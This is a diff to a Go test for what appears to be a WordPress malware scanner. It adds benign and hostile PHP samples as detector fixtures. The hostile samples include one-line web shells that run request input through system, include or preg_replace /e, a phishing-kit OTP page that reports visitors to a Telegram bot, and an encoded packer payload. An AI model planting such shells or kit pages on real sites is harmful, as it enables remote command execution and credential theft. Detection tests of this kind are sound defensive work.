@@ -928,6 +928,8 @@ func TestFleetLibrariesOfScan62(t *testing.T) {
 		"/home2/u/public_html/wp-content/plugins/x/xmlrpc-3.0/lib/xmlrpcs.inc": "<?php\nfunction _xmlrpcs_errorHandler($c, $e) {\n\t$GLOBALS['_xmlrpcs_prev_ehandler']($c, $e);\n}\nfunction parse($d) { return gzuncompress($d); }\n",
 		// Unyson: a random string built with chr(), far from any callback.
 		"/home2/u/public_html/wp-content/plugins/unyson/framework/helpers/general.php": "<?php\nfunction fw_rand($sha) {\n\t$rnd = '';\n\tfor ($c = 0; $c < 32; $c += 2) { $rnd .= chr( hexdec( $sha[ $c ] . $sha[ $c + 1 ] ) ); }\n\treturn $rnd;\n}\n" + strings.Repeat("function fw_helper_x() { return get_option('fw_x'); }\n", 60) + "function fw_call($cb) { return isset($_SERVER['windir']) ? $cb() : $cb(); }\n",
+		// A Telegram login-alert plugin with its own settings form.
+		"/home2/u/public_html/wp-content/plugins/tg-alerts/admin.php": "<?php\nwp_remote_get('https://api.telegram.org/bot' . get_option('tg_t') . '/sendMessage?text=login');\n?><form method=\"post\"><input type=\"password\" name=\"tg_t\"></form>\n",
 		// LiteSpeed Cache's settings, PicoFeed's site rules, Filament stubs.
 		"/home2/u/public_html/wp-content/.litespeed_conf.php":                                                   "<?php exit; // LiteSpeed Cache runtime configuration. Do not edit. ?>\n{\"debug\":0,\"object-kind\":false}",
 		"/home2/u/public_html/wp-content/plugins/penci-feeds/classes/libs/fguillot/PicoFeed/Rules/.wsj.com.php": "<?php\nreturn array(\n\t'grabber' => array('%.*%' => array('test_url' => 'https://example.test/a', 'body' => array('//div[@class=\"article\"]'))),\n);\n",
@@ -974,13 +976,17 @@ func TestFleetLibrariesOfScan62(t *testing.T) {
 		t.Errorf("extensionless phar flagged: %+v", d)
 	}
 	for p, body := range map[string]string{
-		"/home2/u/public_html/wp-content/x1.php":                "<?php\n$f = $_POST['f'];\ncall_user_func_array($f, array($_POST['a']));\n",
-		"/home2/u/public_html/wp-content/x2.php":                "<?php\necho preg_replace('/.*/e', $_POST['c'], 'x');\n",
-		"/home2/u/public_html/wp-content/x3.php":                "<?php\necho preg_replace(\"/(.*)/e\", \"eval('\\\\1')\", 'x');\n",
-		"/home2/u/public_html/wp-content/x4.php":                "<?php\nsystem($_SERVER['HTTP_CMD']);\n",
-		"/home2/u/public_html/wp-content/x5.php":                "<?php\n$GLOBALS['_1452_'][3](base64_decode('aW5lcnQ='));\n",
-		"/home2/u/public_html/wp-content/x6.php":                "<?php\n$k = 'x';\n$s = '';\nfor ($i = 0; $i < 9; $i++) { $s .= chr(ord($k[$i % 1]) ^ 7); }\n$s($_POST['a']);\n",
-		"/home2/u/public_html/wp-content/.x_7.php":              "<?php exit_soon(); include $_GET['p'];",
+		"/home2/u/public_html/wp-content/x1.php":   "<?php\n$f = $_POST['f'];\ncall_user_func_array($f, array($_POST['a']));\n",
+		"/home2/u/public_html/wp-content/x2.php":   "<?php\necho preg_replace('/.*/e', $_POST['c'], 'x');\n",
+		"/home2/u/public_html/wp-content/x3.php":   "<?php\necho preg_replace(\"/(.*)/e\", \"eval('\\\\1')\", 'x');\n",
+		"/home2/u/public_html/wp-content/x4.php":   "<?php\nsystem($_SERVER['HTTP_CMD']);\n",
+		"/home2/u/public_html/wp-content/x5.php":   "<?php\n$GLOBALS['_1452_'][3](base64_decode('aW5lcnQ='));\n",
+		"/home2/u/public_html/wp-content/x6.php":   "<?php\n$k = 'x';\n$s = '';\nfor ($i = 0; $i < 9; $i++) { $s .= chr(ord($k[$i % 1]) ^ 7); }\n$s($_POST['a']);\n",
+		"/home2/u/public_html/wp-content/.x_7.php": "<?php exit_soon(); include $_GET['p'];",
+		// A SumUp kit page: visits reported to a bot, an OTP form.
+		"/home2/u/public_html/wp-admin/sumup/web/email.php": "<?php\nfunction notify($m, $t, $c) { return file_get_contents('https://api.telegram.org/bot' . $t . '/sendMessage?chat_id=' . $c . '&text=' . urlencode($m)); }\nnotify('user in the email page!', $bot_token, $rez_chat);\n?><title>Authentication - EMAIL</title><form method=\"post\" action=\"send.php\"><input name=\"11\" autocomplete=\"one-time-code\" maxlength=\"1\"></form>\n",
+		// A packer's payload in one long escaped string.
+		"/home2/u/public_html/recommend.php":                    "<?php\n$p = base64_decode(\"" + strings.Repeat("\\x61\\x57\\x35\\x6c", 30) + "\");\n$k = openssl_decrypt($p, 'aes-128-cbc', 'k');\n",
 		"/home2/u/public_html/wp-content/x8.php":                "<?php\n$c = $_POST['c'];\necho preg_replace('/.*/e', '\\0', $c);\n",
 		"/home2/u/public_html/wp-content/x9.php":                "<?php\n$f = $_POST['f'];\nif (in_array($f, array('system', 'exec'))) { call_user_func_array($f, array($_POST['a'])); }\n",
 		"/home2/u/public_html/wp-content/.stubs_9f3a1c7e2b.php": "<?php echo 'inert';",
